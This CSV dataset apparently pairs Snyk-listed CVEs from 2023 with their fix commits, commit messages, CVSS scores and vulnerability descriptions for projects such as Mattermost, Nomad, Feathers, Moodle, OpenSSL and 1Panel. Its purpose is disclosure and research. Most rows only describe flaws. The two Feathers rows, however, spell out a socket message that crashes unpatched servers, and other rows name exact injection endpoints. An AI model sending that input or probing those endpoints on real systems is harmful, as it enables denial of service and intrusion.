CVE-2023-3593,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVER-5798042,20/07/2023,20/07/2023,https://github.com/mattermost/mattermost/commit/1b61e43a4abf085696e418530f0a32d4572712c7,Denial of Service (DoS),https://api.github.com/repos/mattermost/mattermost/commits/1b61e43a4abf085696e418530f0a32d4572712c7,Vishal,vish@mattermost.com,mattermost,1b61e43a4abf085696e418530f0a32d4572712c7,"Manual cherry pick of [MM-52527] (#23519) (#23675)

Automatic Merge",Go,6.5,medium,"github.com/mattermost/mattermost-server is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Denial of Service (DoS) by passing in a very long markdown input.",2023
CVE-2023-3591,CWE-1259,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVERAPP-5798044,20/07/2023,20/07/2023,https://github.com/mattermost/mattermost/commit/14c8271352533020d48bec827a56649f8acfc3ca,Improper Restriction of Security Token Assignment,https://api.github.com/repos/mattermost/mattermost/commits/14c8271352533020d48bec827a56649f8acfc3ca,Scott Bishel,scott.bishel@mattermost.com,mattermost,14c8271352533020d48bec827a56649f8acfc3ca,"MM-52477 - remove recovery tokens when creating a new one (#23171) (#23585)

* remove recovery tokens when creating a new one

* add app layers, unit test, i18 extract

* lint fixes

* fix unit test

(cherry picked from commit 355bc6502c56a56c35afcded467771a4619f33a0)",Go,4.8,medium,"github.com/mattermost/mattermost-server/app is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Improper Restriction of Security Token Assignment. Mattermost fails to invalidate previously generated password reset tokens when a new reset token was created.",2023
CVE-2023-3584,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVERAPI4-5797943,20/07/2023,20/07/2023,https://github.com/mattermost/mattermost/commit/18ea9f7c52da31eac01168953101263eab212496,Access Control Bypass,https://api.github.com/repos/mattermost/mattermost/commits/18ea9f7c52da31eac01168953101263eab212496,Harshil Sharma,18575143+harshilsharma63@users.noreply.github.com,mattermost,18ea9f7c52da31eac01168953101263eab212496,"[MM-51401] Add an extra check for the schema (#22531) (#23486)

Automatic Merge",Go,4.3,medium,"github.com/mattermost/mattermost-server/api4 is an open source, private cloud, Slack-alternative from https://mattermost.org.
Affected versions of this package are vulnerable to Access Control Bypass by failing to properly check the authorization of POST /api/v4/teams when passing a team override scheme ID in the request, allowing a user with knowledge of a Team Override Scheme ID to create a new team with said team override scheme.",2023
CVE-2023-3072,CWE-862,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPNOMADACL-5796262,20/07/2023,20/07/2023,https://github.com/hashicorp/nomad/commit/9cad78f142ab75705030684e4e7200d01b36338e,Missing Authorization,https://api.github.com/repos/hashicorp/nomad/commits/9cad78f142ab75705030684e4e7200d01b36338e,Luiz Aoqui,luiz@hashicorp.com,nomad,9cad78f142ab75705030684e4e7200d01b36338e,"acl: fix parsing of policies with blocks w/o label

An ACL policy with a block without label generates unexpected results.
For example, a policy such as this:

```
namespace {
  policy = ""read""
}
```

Is applied to a namespace called `policy` instead of the documented
behaviour of applying it to the `default` namespace.

This happens because of the way HCL1 decodes blocks. Since it doesn't
know if a block is expected to have a label it applies the `key` tag to
the content of the block and, in the example above, the first key is
`policy`, so it sets that as the `namespace` block label.

Since this happens internally in the HCL decoder it's not possible to
detect the problem externally.

Fixing the problem inside the decoder is challenging because the JSON
and HCL parsers generate different ASTs that makes impossible to
differentiate between a JSON tree from an invalid HCL tree within the
decoder.

The fix in this commit consists of manually parsing the policy after
decoding to clear labels that were not set in the file. This allows the
validation rules to consistently catch and return any errors, no matter
if the policy is an invalid HCL or JSON.",Unknown,4.1,medium,"github.com/hashicorp/nomad/acl is a simple and flexible workload orchestrator to deploy and manage containers (docker, podman), non-containerized applications (executable, Java), and virtual machines (qemu) across on-prem and clouds at scale.
Nomad is supported on Linux, Windows, and macOS. A commercial version of Nomad, Nomad Enterprise, is also available
Affected versions of this package are vulnerable to Missing Authorization such that ACL policies using a block without a label generates unexpected results.",2023
CVE-2023-3300,CWE-862,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPNOMADACL-5796213,20/07/2023,20/07/2023,https://github.com/hashicorp/nomad/commit/7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,Missing Authorization,https://api.github.com/repos/hashicorp/nomad/commits/7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,Tim Gross,tgross@hashicorp.com,nomad,7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,"search: fix ACL filtering for plugins and variables

ACL permissions for the search endpoints are done in three passes. The
first (the `sufficientSearchPerms` method) is for performance and coarsely
rejects requests based on the passed-in context parameter if the user has no
permissions to any object in that context. The second (the
`filteredSearchContexts` method) filters out contexts based on whether the user
has permissions either to the requested namespace or again by context (to catch
the ""all"" context). Finally, when iterating over the objects available, we do
the usual filtering in the iterator.

Internal testing found several bugs in this filtering:
* CSI plugins can be searched by any authenticated user.
* Variables can be searched if the user has `job:read` permissions to the
  variable's namespace instead of `variable:list`.
* Variables cannot be searched by wildcard namespace.

This is an information leak of the plugin names and variable paths, which we
don't consider to be privileged information but intended to protect anyways.

This changeset fixes these bugs by ensuring CSI plugins are filtered in the 1st
and 2nd pass ACL filters, and changes variables to check `variable:list` in the
2nd pass filter unless the wildcard namespace is passed (at which point we'll
fallback to filtering in the iterator).

Fixes: CVE-2023-3300
Fixes: #17906",Unknown,5.3,medium,"github.com/hashicorp/nomad/acl is a simple and flexible workload orchestrator to deploy and manage containers (docker, podman), non-containerized applications (executable, Java), and virtual machines (qemu) across on-prem and clouds at scale.
Nomad is supported on Linux, Windows, and macOS. A commercial version of Nomad, Nomad Enterprise, is also available
Affected versions of this package are vulnerable to Missing Authorization. The HTTP search API can reveal names of available CSI plugins to unauthenticated users or users without the plugin:read policy.",2023
CVE-2023-37899,CWE-754,Snyk,https://security.snyk.io/vuln/SNYK-JS-FEATHERSJSTRANSPORTCOMMONS-5794669,20/07/2023,20/07/2023,https://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c,Improper Check for Unusual or Exceptional Conditions,https://api.github.com/repos/feathersjs/feathers/commits/c397ab3a0cd184044ae4f73540549b30a396821c,David Luecke,daff@neyeon.com,feathers,c397ab3a0cd184044ae4f73540549b30a396821c,fix(transport-commons): Handle invalid service paths on socket lookups (#3241),TypeScript,7.5,high,"@feathersjs/transport-commons is a Shared functionality for websocket providers
Affected versions of this package are vulnerable to Improper Check for Unusual or Exceptional Conditions due to not catching invalid string conversion errors like const message = ${{ toString: '' }} which would cause the NodeJS process to crash when sending an unexpected Socket.io message like socket.emit('find', { toString: '' }).",2023
CVE-2023-3300,CWE-862,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPNOMADNOMAD-5796212,20/07/2023,20/07/2023,https://github.com/hashicorp/nomad/commit/7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,Missing Authorization,https://api.github.com/repos/hashicorp/nomad/commits/7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,Tim Gross,tgross@hashicorp.com,nomad,7eba8cfb2df4d636627c5f6e543aa9894e6ffa5b,"search: fix ACL filtering for plugins and variables

ACL permissions for the search endpoints are done in three passes. The
first (the `sufficientSearchPerms` method) is for performance and coarsely
rejects requests based on the passed-in context parameter if the user has no
permissions to any object in that context. The second (the
`filteredSearchContexts` method) filters out contexts based on whether the user
has permissions either to the requested namespace or again by context (to catch
the ""all"" context). Finally, when iterating over the objects available, we do
the usual filtering in the iterator.

Internal testing found several bugs in this filtering:
* CSI plugins can be searched by any authenticated user.
* Variables can be searched if the user has `job:read` permissions to the
  variable's namespace instead of `variable:list`.
* Variables cannot be searched by wildcard namespace.

This is an information leak of the plugin names and variable paths, which we
don't consider to be privileged information but intended to protect anyways.

This changeset fixes these bugs by ensuring CSI plugins are filtered in the 1st
and 2nd pass ACL filters, and changes variables to check `variable:list` in the
2nd pass filter unless the wildcard namespace is passed (at which point we'll
fallback to filtering in the iterator).

Fixes: CVE-2023-3300
Fixes: #17906",Unknown,5.3,medium,"github.com/hashicorp/nomad/nomad is an easy-to-use, flexible, and performant workload orchestrator that can deploy a mix of microservice, batch, containerized, and non-containerized applications. Nomad is easy to operate and scale and has native Consul and Vault integrations.
Affected versions of this package are vulnerable to Missing Authorization. The HTTP search API can reveal names of available CSI plugins to unauthenticated users or users without the plugin:read policy.",2023
CVE-2019-7168,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CROOGOCROOGO-5791152,20/07/2023,14/05/2022,https://github.com/croogo/croogo/commit/cafaaabe2cef3d1d83652370e30563e6ad7c4158,Cross-site Scripting (XSS),https://api.github.com/repos/croogo/croogo/commits/cafaaabe2cef3d1d83652370e30563e6ad7c4158,Rachman Chavik,rchavik@xintesa.com,croogo,cafaaabe2cef3d1d83652370e30563e6ad7c4158,"Fix: XSS

Closes #886, #887, #888, #889, #890, #900",PHP,4.8,medium,"croogo/croogo is an Open Source CMS built for everyone.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, allowing an attacker to execute HTML or JavaScript code in a vulnerable Blog field via /admin/nodes/nodes/add/blog.",2023
CVE-2023-37899,CWE-754,Snyk,https://security.snyk.io/vuln/SNYK-JS-FEATHERSJSSOCKETIO-5794666,20/07/2023,20/07/2023,https://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c,Improper Check for Unusual or Exceptional Conditions,https://api.github.com/repos/feathersjs/feathers/commits/c397ab3a0cd184044ae4f73540549b30a396821c,David Luecke,daff@neyeon.com,feathers,c397ab3a0cd184044ae4f73540549b30a396821c,fix(transport-commons): Handle invalid service paths on socket lookups (#3241),TypeScript,7.5,high,"@feathersjs/socketio is a The Feathers Socket.io real-time API provider
Affected versions of this package are vulnerable to Improper Check for Unusual or Exceptional Conditions due to not catching invalid string conversion errors like const message = ${{ toString: '' }} which would cause the NodeJS process to crash when sending an unexpected Socket.io message like socket.emit('find', { toString: '' }).",2023
CVE-2019-7169,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CROOGOCROOGO-5791095,20/07/2023,14/05/2022,https://github.com/croogo/croogo/commit/cafaaabe2cef3d1d83652370e30563e6ad7c4158,Cross-site Scripting (XSS),https://api.github.com/repos/croogo/croogo/commits/cafaaabe2cef3d1d83652370e30563e6ad7c4158,Rachman Chavik,rchavik@xintesa.com,croogo,cafaaabe2cef3d1d83652370e30563e6ad7c4158,"Fix: XSS

Closes #886, #887, #888, #889, #890, #900",PHP,4.8,medium,"croogo/croogo is an Open Source CMS built for everyone.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, allowing an attacker to execute HTML or JavaScript code in a vulnerable Title field, via /admin/menus/menus/edit/3.",2023
CVE-2021-39193,CWE-1284,Snyk,https://security.snyk.io/vuln/SNYK-RUST-FRONTIER-5790228,20/07/2023,01/09/2021,https://github.com/paritytech/frontier/commit/0b962f218f0cdd796dadfe26c3f09e68f7861b26,Improper Validation of Specified Quantity in Input,https://api.github.com/repos/paritytech/frontier/commits/0b962f218f0cdd796dadfe26c3f09e68f7861b26,tgmichel,telmo@purestake.com,frontier,0b962f218f0cdd796dadfe26c3f09e68f7861b26,Add transaction cost pre-validation (#465),Unknown,5.3,medium,"Affected versions of this package are vulnerable to Improper Validation of Specified Quantity in Input. A bug in pallet-ethereum can cause invalid transactions to be included in the Ethereum block state in pallet-ethereum due to not validating the input data size. Any invalid transactions included this way have no possibility to alter the internal Ethereum or Substrate state. The transaction will appear to have be included, but is of no effect as it is rejected by the EVM engine. The impact is further limited by Substrate extrinsic size constraints.",2023
CVE-2023-2975,CWE-345,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENSSL-5789817,20/07/2023,07/07/2023,https://github.com/openssl/openssl/commit/00e2f5eea29994d19293ec4e8c8775ba73678598,Insufficient Verification of Data Authenticity,https://api.github.com/repos/openssl/openssl/commits/00e2f5eea29994d19293ec4e8c8775ba73678598,Tomas Mraz,tomas@openssl.org,openssl,00e2f5eea29994d19293ec4e8c8775ba73678598,"Do not ignore empty associated data with AES-SIV mode

The AES-SIV mode allows for multiple associated data items
authenticated separately with any of these being 0 length.

The provided implementation ignores such empty associated data
which is incorrect in regards to the RFC 5297 and is also
a security issue because such empty associated data then become
unauthenticated if an application expects to authenticate them.

Fixes CVE-2023-2975

Reviewed-by: Matt Caswell <matt@openssl.org>
Reviewed-by: Paul Dale <pauli@openssl.org>
(Merged from https://github.com/openssl/openssl/pull/21384)

(cherry picked from commit c426c281cfc23ab182f7d7d7a35229e7db1494d9)",C/C++,3.7,low,"Affected versions of this package are vulnerable to Insufficient Verification of Data Authenticity in the AES-SIV cipher implementation in ciphers/cipher_aes_siv.c, which ignores empty associated data entries, making them unauthenticated. 
Applications that use the AES-SIV algorithm and want to authenticate empty data entries as associated data can be misled by removing, adding or reordering such empty entries as these are ignored by the OpenSSL implementation. 
NOTE:  This issue does not affect non-empty associated data authentication and the maintainers are currently unaware of any applications that use empty associated data entries.",2023
CVE-2019-3808,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5789816,20/07/2023,13/05/2022,https://github.com/moodle/moodle/commit/279df86c7f706c8e35f90f5b18e3fcfaa20d2f6e,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/279df86c7f706c8e35f90f5b18e3fcfaa20d2f6e,Michael Hawkins,michaelh@moodle.com,moodle,279df86c7f706c8e35f90f5b18e3fcfaa20d2f6e,MDL-64395 groups: Added XSS Risk to the manage groups capability,PHP,5.4,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization. The 'manage groups' capability does not have the 'XSS risk' flag assigned to it, but does have that access in certain places. 
Note:
This capability is intended for use by trusted users, and is only assigned to teachers and managers by default.",2023
CVE-2019-8336,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPCONSULAGENT-5789038,20/07/2023,13/05/2022,https://github.com/hashicorp/consul/commit/90040f8bffb311e6cd8599273e95b607175e311f,Access Restriction Bypass,https://api.github.com/repos/hashicorp/consul/commits/90040f8bffb311e6cd8599273e95b607175e311f,Matt Keeler,mkeeler@hashicorp.com,consul,90040f8bffb311e6cd8599273e95b607175e311f,"Fixes for CVE-2019-8336

Fix error in detecting raft replication errors.

Detect redacted token secrets and prevent attempting to insert.

Add a Redacted field to the TokenBatchRead and TokenRead RPC endpoints

This will indicate whether token secrets have been redacted.

Ensure any token with a redacted secret in secondary datacenters is removed.

Test that redacted tokens cannot be replicated.",Go,8.1,high,"github.com/hashicorp/consul/agent is a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure.
Affected versions of this package are vulnerable to Access Restriction Bypass. The issue allows a client to bypass intended access restrictions and obtain the privileges of one other arbitrary token within secondary datacenters because a token with literally """" as its secret is used in unusual circumstances.",2023
CVE-2023-38403,CWE-130,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-IPERF-5788305,20/07/2023,20/07/2023,https://github.com/esnet/iperf/commit/0ef151550d96cc4460f98832df84b4a1e87c65e9,Improper Handling of Length Parameter Inconsistency,https://api.github.com/repos/esnet/iperf/commits/0ef151550d96cc4460f98832df84b4a1e87c65e9,Bruce A. Mah,bmah@es.net,iperf,0ef151550d96cc4460f98832df84b4a1e87c65e9,"Fix memory allocation hazard (#1542). (#1543)

Reported by:	@someusername123 on GitHub",C/C++,7.5,high,Affected versions of this package are vulnerable to Improper Handling of Length Parameter Inconsistency which allows peers to cause an integer overflow and heap corruption via a crafted length field.,2023
CVE-2023-37480,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ETHYCAFIDES-5788304,20/07/2023,20/07/2023,https://github.com/ethyca/fides/commit/5aea738463960d81821c11ae7ade1d627a46bf32,Denial of Service (DoS),https://api.github.com/repos/ethyca/fides/commits/5aea738463960d81821c11ae7ade1d627a46bf32,Adrian Galvan,adrian@ethyca.com,fides,5aea738463960d81821c11ae7ade1d627a46bf32,"Merge pull request from GHSA-g95c-2jgm-hqc6

Co-authored-by: Dave Quinlan <83430497+daveqnet@users.noreply.github.com>",Python,4.9,medium,"ethyca-fides is an Open-source ecosystem for data privacy as code.
Affected versions of this package are vulnerable to Denial of Service (DoS) due to the save_template() function in connector_registry_service.py accepting uploads of files that could contain a zip bomb. Users with elevated privileges with the CONNECTOR_TEMPLATE_REGISTER scope can exploit this to deny access to all users of the affected server.",2023
CVE-2023-37266,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMICEWHALETECHCASAOSROUTE-5788303,20/07/2023,20/07/2023,https://github.com/IceWhaleTech/CasaOS/commit/705bf1facbffd2ca40b159b0303132b6fdf657ad,Information Exposure,https://api.github.com/repos/IceWhaleTech/CasaOS/commits/705bf1facbffd2ca40b159b0303132b6fdf657ad,link,a624669980@163.com,CasaOS,705bf1facbffd2ca40b159b0303132b6fdf657ad,Update jwt (#1025),Unknown,9.8,critical,"Affected versions of this package are vulnerable to Information Exposure. CasaOS is an open-source Personal Cloud system. Unauthenticated attackers can craft arbitrary JWTs and access features that usually require authentication and execute arbitrary commands as root on CasaOS instances. This problem was addressed by improving the validation of JWTs in commit 705bf1f. This patch is part of CasaOS 0.4.4. Users should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly.",2023
CVE-2019-18466,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERSPODMANV4CMDPODMAN-5783255,19/07/2023,24/05/2022,https://github.com/containers/libpod/commit/5c09c4d2947a759724f9d5aef6bac04317e03f7e,Symlink Attack,https://api.github.com/repos/containers/libpod/commits/5c09c4d2947a759724f9d5aef6bac04317e03f7e,OpenShift Merge Robot,openshift-merge-robot@users.noreply.github.com,libpod,5c09c4d2947a759724f9d5aef6bac04317e03f7e,"Merge pull request #3942 from jwhonce/issue/3829

Stop glob'ing on podman cp",Go,5.5,medium,"github.com/containers/podman/v4/cmd/podman is a daemonless container runtime for managing containers, pods, and container images
Affected versions of this package are vulnerable to Symlink Attack when it resolves a symlink in the host context during a copy operation from the container to the host, because an undesired glob operation occurs. An attacker could create a container image containing particular symlinks that, when copied by a victim user to the host filesystem, may overwrite existing files with others from the host.",2023
CVE-2019-18466,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERSPODMANCMDPODMAN-5783254,19/07/2023,24/05/2022,https://github.com/containers/libpod/commit/5c09c4d2947a759724f9d5aef6bac04317e03f7e,Symlink Attack,https://api.github.com/repos/containers/libpod/commits/5c09c4d2947a759724f9d5aef6bac04317e03f7e,OpenShift Merge Robot,openshift-merge-robot@users.noreply.github.com,libpod,5c09c4d2947a759724f9d5aef6bac04317e03f7e,"Merge pull request #3942 from jwhonce/issue/3829

Stop glob'ing on podman cp",Go,5.5,medium,"github.com/containers/podman/cmd/podman is a daemonless container runtime for managing containers, pods, and container images
Affected versions of this package are vulnerable to Symlink Attack when it resolves a symlink in the host context during a copy operation from the container to the host, because an undesired glob operation occurs. An attacker could create a container image containing particular symlinks that, when copied by a victim user to the host filesystem, may overwrite existing files with others from the host.",2023
CVE-2023-37476,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGOPENREFINE-5783252,19/07/2023,19/07/2023,https://github.com/OpenRefine/OpenRefine/commit/e9c1e65d58b47aec8cd676bd5c07d97b002f205e,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/OpenRefine/OpenRefine/commits/e9c1e65d58b47aec8cd676bd5c07d97b002f205e,Antonin Delpeuch,antonin@delpeuch.eu,OpenRefine,e9c1e65d58b47aec8cd676bd5c07d97b002f205e,"Merge pull request from GHSA-m88m-crr9-jvqq

* Fix zip slip vulnerability in project import command

* Add zip-slip.tar test resource",Java,5.5,medium,"Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) via project import, when a carefully crafted malicious OpenRefine project tar file can be used to trigger arbitrary code execution if a user can be convinced to import it.",2023
CVE-2023-37481,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ETHYCAFIDES-5783250,19/07/2023,19/07/2023,https://github.com/ethyca/fides/commit/8beaace082b325e693dc7682029a3cb7e6c2b69d,Denial of Service (DoS),https://api.github.com/repos/ethyca/fides/commits/8beaace082b325e693dc7682029a3cb7e6c2b69d,Adrian Galvan,adrian@ethyca.com,fides,8beaace082b325e693dc7682029a3cb7e6c2b69d,"Merge pull request from GHSA-3rw2-wfc8-wmj5

* Adding checks for malicious SVGs

* Fixing merge conflicts

---------

Co-authored-by: Dave Quinlan <83430497+daveqnet@users.noreply.github.com>",Unknown,2.7,low,"ethyca-fides is an Open-source ecosystem for data privacy as code.
Affected versions of this package are vulnerable to Denial of Service (DoS) by uploading zip files containing malicious SVG bombs (similar to a billion laughs attack), causing resource exhaustion in Admin UI browser tabs, and creating a persistent denial of service of the 'new connector' page (datastore-connection/new).
Note:
Exploitation is limited to users with elevated privileges with the CONNECTOR_TEMPLATE_REGISTER scope, which includes root users and users with the owner role.",2023
CVE-2023-37259,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-MATRIXREACTSDK-5783251,19/07/2023,18/07/2023,https://github.com/matrix-org/matrix-react-sdk/commit/22fcd34c606f32129ebc967fc21f24fb708a98b8,Cross-site Scripting (XSS),https://api.github.com/repos/matrix-org/matrix-react-sdk/commits/22fcd34c606f32129ebc967fc21f24fb708a98b8,RiotRobot,releases@riot.im,matrix-react-sdk,22fcd34c606f32129ebc967fc21f24fb708a98b8,Sanitise strings going into the html export CVE-2023-37259,Unknown,6.1,medium,"matrix-react-sdk is a SDK for matrix.org using React
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the Export Chat feature, which includes certain attacker-controlled elements in the generated document without sufficient escaping.
Note:
An attacker can only inject code run from the null origin, restricting the impact.",2023
CVE-2023-37477,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKENDAPPSERVICE-5783197,19/07/2023,19/07/2023,https://github.com/1Panel-dev/1Panel/commit/e17b80cff4975ee343568ff526b62319f499005d,Arbitrary Code Execution,https://api.github.com/repos/1Panel-dev/1Panel/commits/e17b80cff4975ee343568ff526b62319f499005d,ssongliu,73214554+ssongliu@users.noreply.github.com,1Panel,e17b80cff4975ee343568ff526b62319f499005d,fix: 解决部分接口命令注入问题 (#1690),Go,7.2,high,"Affected versions of this package are vulnerable to Arbitrary Code Execution via the /hosts/firewall/ip endpoint of the firewall functionality which reads user input without validation. An attacker can extend the default functionality of the application, which executes system commands.",2023
CVE-2023-37477,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKENDI18N-5783199,19/07/2023,19/07/2023,https://github.com/1Panel-dev/1Panel/commit/e17b80cff4975ee343568ff526b62319f499005d,Arbitrary Code Execution,https://api.github.com/repos/1Panel-dev/1Panel/commits/e17b80cff4975ee343568ff526b62319f499005d,ssongliu,73214554+ssongliu@users.noreply.github.com,1Panel,e17b80cff4975ee343568ff526b62319f499005d,fix: 解决部分接口命令注入问题 (#1690),Go,7.2,high,"Affected versions of this package are vulnerable to Arbitrary Code Execution via the /hosts/firewall/ip endpoint of the firewall functionality which reads user input without validation. An attacker can extend the default functionality of the application, which executes system commands.",2023
CVE-2023-37477,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKENDCONSTANT-5783198,19/07/2023,19/07/2023,https://github.com/1Panel-dev/1Panel/commit/e17b80cff4975ee343568ff526b62319f499005d,Arbitrary Code Execution,https://api.github.com/repos/1Panel-dev/1Panel/commits/e17b80cff4975ee343568ff526b62319f499005d,ssongliu,73214554+ssongliu@users.noreply.github.com,1Panel,e17b80cff4975ee343568ff526b62319f499005d,fix: 解决部分接口命令注入问题 (#1690),Go,7.2,high,"Affected versions of this package are vulnerable to Arbitrary Code Execution via the /hosts/firewall/ip endpoint of the firewall functionality which reads user input without validation. An attacker can extend the default functionality of the application, which executes system commands.",2023
CVE-2023-37477,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKENDUTILSFIREWALL-5783200,19/07/2023,19/07/2023,https://github.com/1Panel-dev/1Panel/commit/e17b80cff4975ee343568ff526b62319f499005d,Arbitrary Code Execution,https://api.github.com/repos/1Panel-dev/1Panel/commits/e17b80cff4975ee343568ff526b62319f499005d,ssongliu,73214554+ssongliu@users.noreply.github.com,1Panel,e17b80cff4975ee343568ff526b62319f499005d,fix: 解决部分接口命令注入问题 (#1690),Go,7.2,high,"Affected versions of this package are vulnerable to Arbitrary Code Execution via the /hosts/firewall/ip endpoint of the firewall functionality which reads user input without validation. An attacker can extend the default functionality of the application, which executes system commands.",2023
CVE-2023-37897,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETGRAVGRAV-5783183,19/07/2023,19/07/2023,https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/getgrav/grav/commits/71bbed12f950de8335006d7f91112263d8504f1b,Andy Miller,rhuk@mac.com,grav,71bbed12f950de8335006d7f91112263d8504f1b,more SSTI fixes in Utils::isDangerousFunction(),Markdown,7.2,high,"getgrav/grav is a Modern, Crazy Fast, Ridiculously Easy and Amazingly Powerful Flat-File CMS.
Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') due to incorrect return value from isDangerousFunction(), which allows to execution of the payload prepending double backslash (\\). The isDangerousFunction() check returns a false value instead of true when the \ symbol is found in the $name. 
Note:
This vulnerability can be exploited if the attacker has access to:

An Administrator account.

A non-administrator user account that has Admin panel access and Create/Update page permissions.",2023
CVE-2019-14880,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5783181,19/07/2023,24/05/2022,https://github.com/moodle/moodle/commit/034729a5cef1ecc17815ffb7e5dd1501af2694b0,Improper Authentication,https://api.github.com/repos/moodle/moodle/commits/034729a5cef1ecc17815ffb7e5dd1501af2694b0,Jun Pataleta,jun@moodle.com,moodle,034729a5cef1ecc17815ffb7e5dd1501af2694b0,"MDL-66598 tool_oauth2: Make account confirmation required by default

* Only Facebook, Google, and Microsoft issuers can optionally offer to
require account confirmation via email. We will require email
confirmation for the rest of the issuers.",PHP,4.8,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Improper Authentication. OAuth 2 providers who do not verify users' email address changes require additional verification during sign-up to reduce the risk of account compromise.",2023
CVE-2023-38200,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-KEYLIME-5783180,19/07/2023,12/07/2023,https://github.com/keylime/keylime/commit/c68d8f0b7ea549c12b6956ab0f3c28ae0360ae17,Denial of Service (DoS),https://api.github.com/repos/keylime/keylime/commits/c68d8f0b7ea549c12b6956ab0f3c28ae0360ae17,florian,264356+flozilla@users.noreply.github.com,keylime,c68d8f0b7ea549c12b6956ab0f3c28ae0360ae17,"Extend Registrar SSL socket to be non-blocking

Signed-off-by: florian <264356+flozilla@users.noreply.github.com>",Python,7.5,high,"keylime is a TPM-based key bootstrapping and system integrity measurement system for cloud
Affected versions of this package are vulnerable to Denial of Service (DoS) via SSL connections, which allows an attacker to exhaust all available connections.",2023
CVE-2019-3810,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5783182,19/07/2023,13/05/2022,https://github.com/moodle/moodle/commit/14f9bad3cebf1aa6bb73be48020653e1f792dc29,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/14f9bad3cebf1aa6bb73be48020653e1f792dc29,Michael Hawkins,michaelh@moodle.com,moodle,14f9bad3cebf1aa6bb73be48020653e1f792dc29,MDL-64372 userpix: Escape fullname string on userpix index page,PHP,5.3,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper escape of users' names in the /userpix/ page, which are included as text when hovering over profile images.",2023
CVE-2018-25088,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-POSTGRAASSERVER-5783119,19/07/2023,19/07/2023,https://github.com/blue-yonder/postgraas_server/commit/7cd8d016edc74a78af0d81c948bfafbcc93c937c,SQL Injection,https://api.github.com/repos/blue-yonder/postgraas_server/commits/7cd8d016edc74a78af0d81c948bfafbcc93c937c,Matthias Bach,matthias.bach@blue-yonder.com,postgraas_server,7cd8d016edc74a78af0d81c948bfafbcc93c937c,"Harden the database creation against SQL injections

If using the PostgreSQL backend, database creation was previously vulnerable to SQL injections. This commit fixes these.

There are two tests which no longer behave as expected and have been disabled for now. They use usernames that previously broke the SQL statement but have now become valid. We might want to think about restricting the possible username somewhat again.",Python,5.5,medium,"postgraas-server is a Postgraas is a super simple PostgreSQL-as-a-service
Affected versions of this package are vulnerable to SQL Injection via the function _create_pg_connection/create_postgres_db of the file postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py of the component PostgreSQL Backend Handler.",2023
